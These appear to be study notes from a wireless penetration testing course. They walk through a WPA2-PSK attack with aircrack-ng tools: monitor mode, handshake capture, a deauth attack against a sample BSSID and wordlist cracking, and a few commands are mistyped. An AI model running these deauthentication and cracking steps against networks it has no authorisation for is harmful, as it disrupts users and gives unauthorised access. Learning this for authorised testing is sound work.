# Wireless Penetration Test

**Assessment of wireless network**
- WPA2 PSK (Pre Shared Key)(mostly homes and SME's)
- WPA2 Entreprise (will use radius or credentials)

**Activities performed**
- Evaluating strength of PSK (capturing handshake, trying to crack password)
- Reviewing nearby networks (wardriving, GPS device and walking around to detect networks and devices)
- Assessing guest networks (want to see the separation and what access we can get)
- Checking network access

***
Will do the WPA PSK Exploit walkthrough with a network card

The Hacking Process

- **Place** wireless card into monitor mode
- **Discover** information about network
	- Channel
	- BSSID
- **Select** network and capture data
- **Perform** deauth attack
- **Capture** WPA handshake
- **Attempt** to crack the handshake

Tools we need: Wireless Card, Router, Laptop

From Kali machine:
```
# iwconfig
# airmong-ng check kill
# airmong-ng start wlan0
# iwconfig
# airodump wlan0mon
```
- 'check kill' will see what processes are running and interfering with what we want to do and kill them 
- 'airodump wlan0mon' will see what networks are around and give us BSSID's (MAC address of acces point)
- PWR the lower (or more positive) the number, the closer the device is to us 
- We see the channel we are on, the encryption, and other networks (hidden and others)

After we know the BSSID:
```
# airodump-ng -c 6 --bssid 50:c7:89:BA:00:73 -w capture wlan0mon
```

will store our results in 'capture.cap'

We can perform a deauth attack to speed up the process:
```
# aireplay-ng -0 1 -a 50:c7:89:BA:00:73 -c <stationAddress> wlan0mon
```
- `-0` to specify deauth attack
- `1` to run this once

Can use capture.cap to crack using hashcat or aircrack:
```
# aircrack-ng -w wordlist.txt -b 50:c7:89:BA:00:73 capture.cap
```
